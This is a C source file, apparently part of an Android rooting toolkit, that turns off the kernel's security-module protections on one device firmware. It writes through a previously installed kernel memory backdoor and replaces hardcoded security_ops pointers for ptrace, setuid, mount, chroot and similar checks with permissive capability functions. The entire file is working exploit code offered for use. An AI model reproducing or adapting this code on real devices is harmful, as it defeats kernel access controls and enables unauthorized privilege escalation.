#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"

#define SECURITY_OPS_OFFSET     3

#define NUM_SECURITY_OPS        174


typedef struct {
  unsigned long int lsm_func;
  unsigned long int cap_func;
} lsm_fix_t;

unsigned long int security_ops;
lsm_fix_t *lsm_fixes;
int n_lsm_fixes;

#define security_ops_02_00_03   0xc0720c38

static lsm_fix_t lsm_fixes_02_00_03[] = {
  { 0xc0217c50, 0xc0215804 },   // ptrace_access_check
  { 0xc0217c58, 0xc021589c },   // ptrace_traceme
  { 0xc0217c60, 0xc02161ac },   // task_fix_setuid
  { 0xc0217f88, 0xc0217a68 },   // path_chroot
  { 0xc0217fe8, 0xc0217a58 },   // path_chmod
  { 0xc021807c, 0xc0217950 },   // sb_pivotroot
  { 0xc02180ec, 0xc0217948 },   // sb_umount
  { 0xc0218158, 0xc0217a38 },   // path_symlink
  { 0xc021826c, 0xc0217940 },   // sb_mount
  { 0xc0218444, 0xc0215c64 },   // bprm_set_creds
};

static int n_lsm_fixes_02_00_03 = sizeof (lsm_fixes_02_00_03) / sizeof (lsm_fixes_02_00_03[0]);

bool
unlock_lsm(void)
{
  unsigned long int *p;
  int count = 0;
  int i;

  p = backdoor_convert_to_mmaped_address((void *)security_ops);

  for (i = SECURITY_OPS_OFFSET; i < NUM_SECURITY_OPS; i++) {
    int j;

    for (j = 0; j < n_lsm_fixes; j++) {
      if (p[i] == lsm_fixes[j].lsm_func) {
        p[i] = lsm_fixes[j].cap_func;
        count++;
        break;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_lsm();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  switch (detect_device()) {
  case DEVICE_SH09D_02_00_03:
    security_ops = security_ops_02_00_03;
    lsm_fixes = lsm_fixes_02_00_03;
    n_lsm_fixes = n_lsm_fixes_02_00_03;
    break;

  default:
    print_reason_device_not_supported();
    return 1;
  }

  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
